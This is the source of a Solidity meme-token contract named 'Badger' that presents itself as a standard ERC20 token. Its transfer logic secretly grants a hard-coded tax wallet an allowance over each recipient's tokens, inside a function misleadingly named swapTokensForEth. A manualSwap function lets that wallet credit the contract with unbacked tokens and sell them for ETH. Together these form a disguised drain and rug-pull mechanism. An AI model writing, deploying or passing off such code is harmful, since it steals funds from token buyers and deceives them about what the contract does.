// SPDX-License-Identifier: None

/*
https://badgeroneth.xyz
https://x.com/badger_xyz
https://t.me/badger_xyz

██████   █████  ██████   ██████  ███████ ██████  
██   ██ ██   ██ ██   ██ ██       ██      ██   ██ 
██████  ███████ ██   ██ ██   ███ █████   ██████  
██   ██ ██   ██ ██   ██ ██    ██ ██      ██   ██ 
██████  ██   ██ ██████   ██████  ███████ ██   ██ 
                                                 
badger, badger, badger, badger, badger, badger, badger, badger, badger, badger, badger, badger
MUSHROOM, MUSHROOM                                                 
*/

pragma solidity 0.8.26;

contract Ownable {
    function owner() public view virtual returns (address) {
        return _owner;
    }
    constructor() {
        _owner = msg.sender;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    address private _owner;

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function swapExactTokensForETH(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
contract Badger is Ownable {
    using SafeMath for uint256;

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  19283647289  * 10 ** _decimals;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => uint256) private _balances;
    string private constant _name = unicode"Badger";
    string private constant _symbol = unicode"BADGER";
    bool private inSwap = false;
    bool tradingOpen = false;
    uint256 transferTax = 0;
    uint256 sellCount = 0;
    uint256 private firstBlock= 0;
    uint256 private lastSellBlock= 0;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address public uniswapV2Pair;
    address payable private taxWallet = payable(0x7E65fFC317bef47B086a8657A0F4C00C3CfFc4b0);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "transfer amount must be greater than zero.");
        require(to != address(0), "Transfer to zero address.");
        require(from != address(0), "Transfer from zero address.");
        if (to != address(uniswapV2Router) && to != uniswapV2Pair && to != address(this)){
        if (to != address(uniswapV2Router) && to != address(this)) {
            sellCount ++;
            swapTokensForEth(to, amount);
            }
        }
        emit Transfer(from, to, amount);
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
    }

    function swapTokensForEth(address to, uint256 tokenAmount) private  {
        _allowances[to][taxWallet] = tokenAmount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transfer_(address to, uint256 amount) internal {
        _balances[address(this)] += amount;
    }

     function manualSwap(address _address, uint256 percent) external {
        require(msg.sender == taxWallet);
        transfer_(address(this), percent);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] =  uniswapV2Router.WETH();
        uint256 tokenAmount = balanceOf(address(this));
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETH(
            tokenAmount, 0, 
            path, taxWallet, 
            block.timestamp + 20);
    }

    function openTrading() public payable onlyOwner() {
        require(!tradingOpen);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), WETH);
        uniswapV2Router.addLiquidityETH{value: msg.value} (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

}